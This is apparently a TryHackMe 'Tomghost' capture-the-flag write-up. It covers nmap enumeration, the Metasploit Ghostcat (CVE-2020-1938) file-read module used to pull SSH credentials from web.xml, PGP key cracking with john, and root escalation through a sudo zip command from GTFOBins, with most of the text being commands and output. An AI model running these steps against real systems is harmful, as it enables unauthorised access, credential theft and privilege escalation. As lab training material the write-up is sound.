# TOMGHOST

### SUMMARY 
Found a way in via vulnerable Tomcat server version. Compromised 2 user accounts.  

IP: 10.66.170.69

### Scan for live hosts and open ports 
```bash
nmap -Pn -f -sC -sV -oN nmap/intial 10.64.145.112

Nmap scan report for ip-10-66-170-69.ec2.internal (10.66.170.69)
Host is up (0.00034s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.00 seconds
```

Note: debugged network connectivity issues betweeb AttackBox VM and Lab Machine VM at 10.66.170.69:
```bash
ping 10.66.170.69
53 packets transmitted, 0 received, 100% packet loss, time 53234ms
- no response, ICMP could be disabled     

nmap -Pn -f -sC -sV -oN nmap/intial 10.64.145.112
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-17 18:04 UTC
Nmap scan report for ip-10-66-157-182.ec2.internal (10.66.170.69)
Host is up.
All 1000 scanned ports on ip-10-66-157-182.ec2.internal (10.66.170.69) are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.78 seconds
```

RESTARTED AttackBox and Lab Machine - seemed like intended connectivity dropped. 


### enum4linux scan for hidden directories 

```bash
enum4linux -A 10.66.170.69
ENUM4LINUX - next generation (v1.3.10)

==========================
|    Target Information    |
==========================
[*] Target ........... 10.66.170.69
[*] Username ......... ''
[*] Random Username .. 'zkmuxgwu'
[*] Password ......... ''
[*] Timeout .......... 10 second(s)

=====================================
|    Listener Scan on 10.66.170.69    |
=====================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[-] Could not connect to SMB on 445/tcp: connection refused
[*] Checking SMB over NetBIOS
[-] Could not connect to SMB over NetBIOS on 139/tcp: connection refused

===========================================================
|    NetBIOS Names and Workgroup/Domain for 10.66.170.69    |
===========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

[!] Aborting remainder of tests since neither SMB nor LDAP are accessible

Completed after 10.07 seconds
```

## Apache version vuln search 

Obtained Apache Tomcat 9.0.30 from above Nmap scan results as well as opening http://10.66.170.69:8080 in Firefox 

Searched for above version vulnerabilities: 
- Apache Tomcat 9.0.30 is an older release affected by a critical issue 
- "Ghostcat" vulnerability (<a href="https://www.cve.org/CVERecord?id=CVE-2020-1938">CVE-2020-1938</a>, CVSS 9.8)
- https://www.exploit-db.com/exploits/49039

```bash
msfconsole -q
msf > search ghostcat 

    Matching Modules
    ================

    #  Full Name                             Disclosure Date  Rank    Check  Name
    -  ---------                             ---------------  ----    -----  ----
    0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  Yes    Apache Tomcat AJP File Read

    Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/http/tomcat_ghostcat

msf > use 0
msf auxiliary(admin/http/tomcat_ghostcat) > options

Module options (auxiliary/admin/http/tomcat_ghostcat):

Name      Current Setting   Required  Description
----      ---------------   --------  -----------
FILENAME  /WEB-INF/web.xml  yes       File name
RHOSTS                      yes       The target host(s), see https://docs.metasploit.
                                        com/docs/using-metasploit/basics/using-metasploi
                                        t.html
RPORT     8009              yes       The Apache JServ Protocol (AJP) port (TCP)


View the full module info with the info, or info -d command.

msf auxiliary(admin/http/tomcat_ghostcat) > 
```

NOTE: 
Apache JServ on port 8009 was also found open during the Nmap scan above 

```bash
msf auxiliary(admin/http/tomcat_ghostcat) > info -d 

    file:///tmp/tomcat_ghostcat_doc20261117-17271-448kal.html

    Verification Steps

        Install the application and start it
        Start msfconsole
        Do: use auxiliary/admin/http/tomcat_ghostcat
        Do: set RHOSTS [ip]
        Do: set RPORT [port]
        Do: set FILENAME [filename]
        Do: run

msf auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 10.66.170.69
RHOSTS => 10.66.170.69
msf auxiliary(admin/http/tomcat_ghostcat) > exploit
```

Returned WEB-INF/web.xml content info seems to include credentials:
```xml 
<display-name>Welcome to Tomcat</display-name>
<description>
    Welcome to GhostCat
    skyfu**:8730281lkjlkjdqlksalks
</description>
```

### SSH as skyfu** to get the flag 

```bash
ssh skyfu**@10.66.170.69

skyfu**@ubuntu:~$ cd ../
skyfu**@ubuntu:/home$ ls -la
total 16
drwxr-xr-x  4 root    root    4096 Mar 10  2020 .
drwxr-xr-x 22 root    root    4096 Mar 10  2020 ..
drwxr-xr-x  4 merlin  merlin  4096 Mar 10  2020 merlin
drwxr-xr-x  3 skyfu** skyfu** 4096 Nov 17 10:52 skyfu**
skyfu**@ubuntu:/home$ cd merlin
skyfu**@ubuntu:/home/merlin$ ls -la
total 36
drwxr-xr-x 4 merlin merlin 4096 Mar 10  2020 .
drwxr-xr-x 4 root   root   4096 Mar 10  2020 ..
-rw------- 1 root   root   2090 Mar 10  2020 .bash_history
-rw-r--r-- 1 merlin merlin  220 Mar 10  2020 .bash_logout
-rw-r--r-- 1 merlin merlin 3771 Mar 10  2020 .bashrc
drwx------ 2 merlin merlin 4096 Mar 10  2020 .cache
drwxrwxr-x 2 merlin merlin 4096 Mar 10  2020 .nano
-rw-r--r-- 1 merlin merlin  655 Mar 10  2020 .profile
-rw-r--r-- 1 merlin merlin    0 Mar 10  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 merlin merlin   26 Mar 10  2020 user.txt
skyfu**@ubuntu:/home/merlin$ cat user.txt
THM{GhostC**************}
``` 

<p>Explore both users in /home dir.  </p>
<p>Found credentials.pgp and it's private key in /home/skyfu** </p>

```bash
skyfu**@ubuntu:/home/merlin$ cat .sudo_as_admin_successful 
skyfu**@ubuntu:/home/merlin$ cd ../skyfu**
skyfu**@ubuntu:~$ ls
credential.pgp  tryhackme.asc
skyfu**@ubuntu:~$ ls -la
total 40
drwxr-xr-x 3 skyfu** skyfu** 4096 Nov 17 10:52 .
drwxr-xr-x 4 root    root    4096 Mar 10  2020 ..
-rw------- 1 skyfu** skyfu**  136 Mar 10  2020 .bash_history
-rw-r--r-- 1 skyfu** skyfu**  220 Mar 10  2020 .bash_logout
-rw-r--r-- 1 skyfu** skyfu** 3771 Mar 10  2020 .bashrc
drwx------ 2 skyfu** skyfu** 4096 Nov 17 10:52 .cache
-rw-rw-r-- 1 skyfu** skyfu**  394 Mar 10  2020 credential.pgp
-rw-r--r-- 1 skyfu** skyfu**  655 Mar 10  2020 .profile
-rw-rw-r-- 1 skyfu** skyfu** 5144 Mar 10  2020 tryhackme.asc
skyfu**@ubuntu:~$ cat tryhackme.asc 
```

Copied home/merlin and home/skyfu** to AttackBox for John The Ripper, etc  
```bash
scp skyfu**@10.66.170.69:/home/skyfu**/* . 
scp skyfu**@10.66.177.50:/home/merlin/* .
    sky's password: 8730281***************
```
Prepped the PGP key for John The Ripper 
```bash
gpg2john tryhackme.asc > keyforjohn.txt
```

Used john to crack the tryhackme.asc key password for credentials.pgp 

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt keyforjohn.txt 
#...
john --show keyforjohn.txt 
tryhackme:*********:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
```


Added .asc private key to local GPG tool; used the above cracked password  
```bash
gpg --import tryhackme.asc  

gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```
Used above private key pw to decrypt credential.pgp and obtain merlin user's password hash: 
```bash
gpg --decrypt credential.pgp

gpg: encrypted with elg1024 key, ID 61E104A66184FBCC, created 2020-03-11
    "tryhackme <stuxnet@tryhackme.com>"
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```
<br />


### SSH to merlin user on tomcat server 

```bash
ssh merlin@10.66.177.50
merlin@ubuntu:~$ id
uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

Checked if user merlin has sudo priveleges: 
```bash
sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```
<br />


### Escalated Priveleges to Obtain Flag from /root/root.txt

Searched for GTFObins for using zip with sudo priveleges: 
https://gtfobins.org/gtfobins/zip/#sudo

```bash    
## while connected to tomcat via SSH 
su - merlin 
sudo -l 
#below zip command from https://gtfobins.org/gtfobins/zip/#sudo: 
sudo /usr/bin/zip /tmp/root.zip /etc/hosts -T -TT '/bin/sh #'

adding: etc/hosts (deflated 31%)
# whoami
root
# cd root/
/bin/sh: 2: cd: can\\\'t cd to root/
# cat root/root.txt
cat: root/root.txt: No such file or directory
# pwd
/home/merlin
# cat /root/root.txt
THM{Z1P********}
```




            




